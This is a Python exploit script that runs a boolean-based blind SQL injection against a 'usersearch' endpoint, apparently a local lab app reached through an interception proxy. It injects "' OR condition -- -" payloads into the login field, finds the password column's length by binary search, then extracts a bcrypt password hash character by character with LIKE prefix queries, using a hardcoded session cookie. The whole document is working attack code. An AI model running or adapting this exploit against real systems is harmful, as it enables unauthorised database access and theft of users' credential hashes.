import requests
import string

# Target URL
url = "http://127.0.0.1:9090/app/usersearch"

# Headers (Including Cookie for Session Persistence)
headers = {
    "Host": "127.0.0.1:9090",
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": "http://127.0.0.1:9090",
    "Referer": "http://127.0.0.1:9090/app/usersearch",
    "Connection": "keep-alive",
}

# Cookies (Modify if session expires)
cookies = {
    "connect.sid": "s%3Agl18CJKnMXsfrpsgQSwJr3chppdDu9TI.wW5i9lyy0mgL2yAYDe80yOr0X6r2Yl%2BkACmdU2y%2BPo4"
}

# Proxy settings (Modify if Burp/ZAP is on a different port)
proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
}

# Bcrypt hashes use these characters
bcrypt_charset = string.ascii_letters + string.digits + "./$"

# Function to check if the SQL query returns True (valid result)
def boolean_query(condition):
    payload = f"' OR {condition} -- -"
    data = {"login": payload}
    print(f"[*] SQLi Payload: {payload}")  # Print the injected query
    response = requests.post(url, headers=headers, cookies=cookies, data=data, proxies=proxies, verify=False)
    return "Search Result" in response.text

# Function to determine the length of the password hash
def get_password_length():
    low, high = 1, 100  # Reasonable upper limit for bcrypt
    print("\n[+] Determining length of `password` field...\n")

    while low <= high:
        mid = (low + high) // 2
        print(f"[DEBUG] low={low}, high={high}, mid={mid}")  # Real-time tracking

        if boolean_query(f"(SELECT LENGTH(password) = {mid})"):
            print(f"[+] Found `password` length: {mid}\n")
            return mid  # Exact length found
        elif boolean_query(f"(SELECT LENGTH(password) > {mid})"):
            low = mid + 1
            print(f"[DEBUG] Increasing lower bound to {low}\n")
        else:
            high = mid - 1
            print(f"[DEBUG] Decreasing upper bound to {high}\n")

    print(f"[+] `password` length determination complete: {low}\n")
    return low  # Fallback return

# Function to brute-force `password` using `LIKE` (prefix matching)
def brute_force_password(length):
    print(f"\n[+] Brute-forcing `password` value (length = {length}) using `LIKE` condition...\n")
    extracted_password = ""

    for i in range(1, length + 1):
        for char in bcrypt_charset:
            test_prefix = extracted_password + char
            print(f"[DEBUG] Trying Prefix: '{test_prefix}'")

            if boolean_query(f"password LIKE '{test_prefix}%'"):
                print(f"[+] Found character at position {i}: {char}")
                extracted_password += char
                print(f"[+] Extracted so far: {extracted_password}")
                break  # Move to next character

    print(f"\n[+] Final Extracted `password` Hash: {extracted_password}\n")
    return extracted_password

# Step 1: Determine the password length
password_length = get_password_length()
print(f"[+] Final Result: Password field length = {password_length}")

# Step 2: Extract the full bcrypt password hash
brute_forced_password = brute_force_password(password_length)